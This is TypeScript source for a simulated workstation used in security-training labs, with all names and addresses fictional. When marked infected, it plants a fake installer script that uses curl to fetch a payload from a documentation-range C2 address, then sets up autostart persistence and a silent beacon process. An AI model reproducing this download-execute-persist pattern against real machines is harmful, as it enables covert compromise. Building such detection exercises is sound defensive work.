import type { FsDir, FsNode, Machine, Proc, StartupEntry } from "./shell";

/**
 * The virtual workstation behind the labs, WS-114 of the fictional Lumen Freight. Every name, domain and
 * address is invented: domains end in the reserved .example, IPs come from the documentation ranges
 * (192.0.2.0/24, 198.51.100.0/24, 203.0.113.0/24), so nothing here points at a real company or host.
 */

export const BEACON_IP = "203.0.113.77";
export const BEACON_PID = 4242;
export const BEACON_STARTUP = "sysupd";

/** A day N days before `today` (YYYY-MM-DD), by calendar arithmetic only. */
export function daysBefore(today: string, n: number): string {
  const d = new Date(`${today}T12:00:00Z`);
  if (Number.isNaN(d.getTime())) return today;
  d.setUTCDate(d.getUTCDate() - n);
  return d.toISOString().slice(0, 10);
}

const file = (content: string): FsNode => ({ kind: "file", content });
const bin = (): FsNode => ({ kind: "file", content: "", binary: true });
const dir = (children: Record<string, FsNode>): FsDir => ({ kind: "dir", children });

/** Learner-facing texts of the machine; the whois prose of the beacon's host defaults to English (the server's scoring copy). */
export type MachineText = { ticket?: string; readme: string; whoisDescr?: string; whoisRemarks?: string };

export function workstation({ today, infected, text }: { today: string; infected: boolean; text: MachineText }): Machine {
  const home: Record<string, FsNode> = {
    Documents: dir({
      "freight-rates-q4.csv": file("route,mode,rate_azn_per_kg\nBaku-Tbilisi,road,0.42\nBaku-Aktau,ferry,0.37\nBaku-Istanbul,rail,0.58"),
      "README.txt": file(text.readme),
    }),
    Downloads: dir(
      infected
        ? {
            "free-pdf-tools.sh": file(
              `#!/bin/sh\n# "Free PDF Tools" installer (downloaded ${daysBefore(today, 1)})\nmkdir -p ~/.cache/.sysupd\ncurl -s http://${BEACON_IP}:8443/p/sysupd -o ~/.cache/.sysupd/sysupd\nchmod +x ~/.cache/.sysupd/sysupd\ncp sysupd.desktop ~/.config/autostart/\n~/.cache/.sysupd/sysupd --silent &`,
            ),
          }
        : {},
    ),
    Desktop: dir({}),
    ".config": dir({
      autostart: dir({
        "nimbus-sync.desktop": file("[Desktop Entry]\nName=Nimbus Sync\nExec=/opt/nimbus/nimbus-sync --background"),
        "lumen-vpn.desktop": file("[Desktop Entry]\nName=Lumen VPN\nExec=/opt/lumen/lumen-vpn --tray"),
        ...(infected ? { "sysupd.desktop": file("[Desktop Entry]\nName=System Update Helper\nExec=/home/analyst/.cache/.sysupd/sysupd --silent\nNoDisplay=true") } : {}),
      }),
    }),
    ".bashrc": file("# ~/.bashrc\nexport PS1='\\u@\\h:\\w$ '\nalias ll='ls -la'"),
  };
  if (infected) {
    home[".cache"] = dir({ ".sysupd": dir({ sysupd: bin(), "sysupd.conf": file(`beacon = ${BEACON_IP}:8443\ninterval = 60s\nid = WS-114-7f3a\nmode = silent`) }) });
    if (text.ticket) home.notes = dir({ "ticket-SEC-2291.txt": file(text.ticket) });
  }

  const procs: Proc[] = [
    { pid: 1, user: "root", cpu: "0.0", mem: "0.1", start: "08:58", cmd: "/sbin/init", role: "system" },
    { pid: 388, user: "root", cpu: "0.0", mem: "0.2", start: "08:58", cmd: "/usr/sbin/sshd -D", role: "system" },
    { pid: 512, user: "root", cpu: "0.0", mem: "0.1", start: "08:58", cmd: "/usr/sbin/cron -f", role: "system" },
    { pid: 733, user: "analyst", cpu: "0.3", mem: "0.4", start: "09:01", cmd: "/usr/bin/pulseaudio --start", role: "legit" },
    { pid: 901, user: "analyst", cpu: "0.6", mem: "1.8", start: "09:01", cmd: "/opt/nimbus/nimbus-sync --background", role: "legit" },
    { pid: 1022, user: "analyst", cpu: "0.1", mem: "0.6", start: "09:01", cmd: "/opt/lumen/lumen-vpn --tray", role: "legit" },
    { pid: 1187, user: "analyst", cpu: "1.2", mem: "3.9", start: "09:03", cmd: "/usr/bin/mailer", role: "legit" },
    { pid: 2290, user: "analyst", cpu: "0.0", mem: "0.1", start: "09:40", cmd: "-bash", role: "shell" },
  ];
  if (infected) procs.push({ pid: BEACON_PID, user: "analyst", cpu: "3.1", mem: "1.2", start: "09:02", cmd: "/home/analyst/.cache/.sysupd/sysupd --silent", role: "malicious" });

  const startup: StartupEntry[] = [
    { name: "nimbus-sync", command: "/opt/nimbus/nimbus-sync --background", role: "legit" },
    { name: "lumen-vpn", command: "/opt/lumen/lumen-vpn --tray", role: "legit" },
  ];
  if (infected) startup.splice(1, 0, { name: BEACON_STARTUP, command: "/home/analyst/.cache/.sysupd/sysupd --silent", role: "malicious" });

  return {
    user: "analyst",
    host: "ws-114",
    home: "/home/analyst",
    fs: dir({
      home: dir({ analyst: dir(home) }),
      opt: dir({ nimbus: dir({ "nimbus-sync": bin() }), lumen: dir({ "lumen-vpn": bin() }) }),
      etc: dir({ hostname: file("ws-114"), hosts: file("127.0.0.1   localhost\n10.20.0.5   mail.lumenfreight.example") }),
      tmp: dir({}),
    }),
    procs,
    conns: [
      { proto: "tcp", local: "0.0.0.0:22", foreign: "0.0.0.0:*", state: "LISTEN", pid: 388 },
      { proto: "tcp", local: "10.20.4.114:40112", foreign: "10.20.0.5:993", state: "ESTABLISHED", pid: 1187 },
      { proto: "tcp", local: "10.20.4.114:51522", foreign: "198.51.100.10:443", state: "ESTABLISHED", pid: 901 },
      ...(infected
        ? [
            { proto: "tcp" as const, local: "10.20.4.114:51740", foreign: `${BEACON_IP}:8443`, state: "ESTABLISHED", pid: BEACON_PID },
            { proto: "tcp" as const, local: "10.20.4.114:51688", foreign: `${BEACON_IP}:8443`, state: "TIME_WAIT", pid: null, owner: BEACON_PID },
            { proto: "tcp" as const, local: "10.20.4.114:51631", foreign: `${BEACON_IP}:8443`, state: "TIME_WAIT", pid: null, owner: BEACON_PID },
          ]
        : []),
      { proto: "udp", local: "10.20.4.114:41194", foreign: "192.0.2.40:1194", state: "ESTABLISHED", pid: 1022 },
      { proto: "udp", local: "0.0.0.0:68", foreign: "0.0.0.0:*", state: "LISTEN", pid: null },
    ],
    startup,
    whois: {
      [BEACON_IP]: [
        "% Information related to '203.0.113.0 - 203.0.113.255'",
        "inetnum:        203.0.113.0 - 203.0.113.255",
        "netname:        KESTREL-VPS-NET",
        `descr:          ${text.whoisDescr ?? "Kestrel VPS - anonymous virtual servers, crypto payments only"}`,
        "org-name:       Kestrel Hosting Ltd (offshore)",
        "country:        --",
        "abuse-mailbox:  (none)",
        `created:        ${daysBefore(today, 3)}`,
        `remarks:        ${text.whoisRemarks ?? "No customer verification. Reported for malware command-and-control."}`,
      ],
      "198.51.100.10": [
        "% Information related to '198.51.100.0 - 198.51.100.255'",
        "inetnum:        198.51.100.0 - 198.51.100.255",
        "netname:        NIMBUS-CLOUD",
        "descr:          Nimbus Cloud Storage - sync endpoints",
        "org-name:       Nimbus Cloud Services Inc.",
        "country:        IE",
        "abuse-mailbox:  abuse@nimbus-cloud.example",
        "created:        2014-03-11",
      ],
      "192.0.2.40": [
        "% Information related to '192.0.2.0 - 192.0.2.255'",
        "inetnum:        192.0.2.0 - 192.0.2.255",
        "netname:        LUMEN-FREIGHT-VPN",
        "descr:          Lumen Freight LLC - corporate VPN gateway",
        "org-name:       Lumen Freight LLC",
        "country:        AZ",
        "abuse-mailbox:  noc@lumenfreight.example",
        "created:        2019-06-02",
      ],
    },
  };
}
